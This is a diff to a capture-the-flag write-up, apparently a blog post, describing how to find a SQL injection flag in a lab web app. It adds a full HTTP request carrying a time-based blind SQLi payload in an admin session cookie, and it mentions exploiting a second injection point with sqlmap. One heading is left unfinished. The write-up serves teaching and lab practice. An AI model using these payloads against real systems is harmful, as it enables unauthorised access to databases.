@@ -283,7 +283,40 @@ Last but not least, flag 3 is about the formidable SQL injection, at least we kn
 
 **Enumeration**
 
-Having said that, this is not an easy SQLi point to find. I have encountered such function while doing flag 2 but because of this it also blinded me from thinking that it is related to flag 3. In a real test, however, we should go through each of the functionality one by one (and systematically) so we won’t miss any. (or, for completeness since the client paid us for that)
+I come across this SQL injection point at the `admin_session_id` parameter where a time delayed can be introduced with my payload `'`
+
+
+
+**Step 1 - Confirming a SQL injection point**
+
+
+
+```
+GET /admin/adminlogon.php HTTP/1.1
+
+Host: [..snip..]:81
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: admin_session_id=3386ac9b6416734e64d51b7cf2946eb440579046 '%2b(select*from(select(sleep(20000)))a)%2b'+; session_id=903da9688d0a0d2a8d04f36da0af44a1
+
+Upgrade-Insecure-Requests: 1
+
+
+```
+It took forever to load since I have put `sleep(20000)` here, now if I run it again by substituting 20000 to 2 - it acts normally.
+
+**Step 2 - 
+
+Having said that, there is another easy and lazy way to win this flag - this is not an easy SQLi point to find though. I have encountered such function while doing flag 2 but because of this it also blinded me from thinking that it is related to flag 3. In a real test, however, we should go through each of the functionality one by one (and systematically) so we won’t miss any. (or, for completeness since the client paid us for that)
 I went through an awful lots of admin functions such as the Search function in Full Summary or Add User which I come across in testing because they are usually the weak spots. Yet, unfortunately, the injection points aren’t there. It’s until I revisit the Records Management I was able to discover a SQL injection point at the `Save Status` function. 
  
 
@@ -316,7 +349,7 @@ The response of such request has revealed a SQL error message after supplementin
 Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1352'' at line 1	
 ```
 
-**SQLMap**
+**The easy and lazy way - SQLMap**
 
 For this SQLi, I leverage the help from sqlmap, which comes in handy (also lazy). Many people would recommend a manual exploitation to understand SQLinjection, which I cannot agree more.
 
